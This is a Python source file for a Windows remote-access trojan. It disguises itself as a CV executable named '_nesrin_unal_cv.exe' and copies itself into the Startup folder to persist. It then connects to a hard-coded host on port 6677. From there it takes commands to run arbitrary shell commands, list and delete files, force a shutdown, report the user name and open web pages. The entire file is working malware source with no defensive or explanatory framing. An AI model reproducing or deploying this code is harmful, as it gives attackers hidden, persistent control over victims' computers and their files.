import socket
import os
import shutil
import webbrowser

user = os.getlogin()
directory = os.getcwd()
path = "C:\\Users\\" + str(user) + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\_nesrin_unal_cv.exe"
des = str(directory) +"\_nesrin_unal_cv.exe"
print(des)

try:
    if os.path.exists(path):
        print("file is exists")
    else:
        shutil.copy(des, path)
except:
    print("Error: File could not find...")

while True:
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect(("192.168.1.41", 6677))
            break
        except:
            print("Trying to connect...")
    while True:
        try:
            data = (s.recv(1024)).decode("utf-8")
        except:
            break
        if data == "user":
            s.sendall(user.encode("utf-8"))
        elif data == "tree":
            tree_input_data = (s.recv(2048)).decode("utf-8")
            try:
                tree_data = str(os.listdir(tree_input_data))
                s.sendall(tree_data.encode("utf-8"))
            except:
                s.sendall("Client: Could not find directory...".encode("utf-8"))
        elif data == "del":
            del_input_data = (s.recv(1024)).decode("utf-8")
            try:
                os.remove(del_input_data)
                s.sendall("Client: Removed".encode("utf-8"))
            except:
                s.sendall("Client: Failed to remove file".encode("utf-8"))
        elif data == "startup":
            try:
                if os.path.exists(path):
                    print("file is exists")
                    s.sendall("Client: File exists".encode("utf-8"))
                else:
                    shutil.copy(des, path)
                    s.sendall("Client: Success: File copied successfully".encode("utf-8"))
            except:
                s.sendall("Client: Error: File could not find...".encode("utf-8"))
        elif data == "command":
            command_data = (s.recv(2048)).decode("utf-8")
            command_data_return = os.popen('"' + command_data + '"')
            send = command_data_return.read()
            s.sendall(send.encode("utf-8"))
            command_data_return.close()
        elif data == "check":
            try:
                s.sendall("Client: LISTENING".encode("utf-8"))
            except:
                print("Could not send message")
                s.sendall("Client: Error: Could not send message to server".encode("utf-8"))
        elif data == "shutdown":
            try:
                os.system("shutdown /f /s")
                s.sendall("Client: shutting down...")
            except:
                try:
                    s.sendall("Client: Could not shutdown")
                except:
                    print("Could not send")
        elif data == "browse":
            try:
                browse_data = (s.recv(2048)).decode("utf-8")
                webbrowser.open(browse_data)
                s.sendall("Client: Browsing...".encode("utf-8"))
            except:
                s.sendall("Client: Could not browse site".encode("utf-8"))
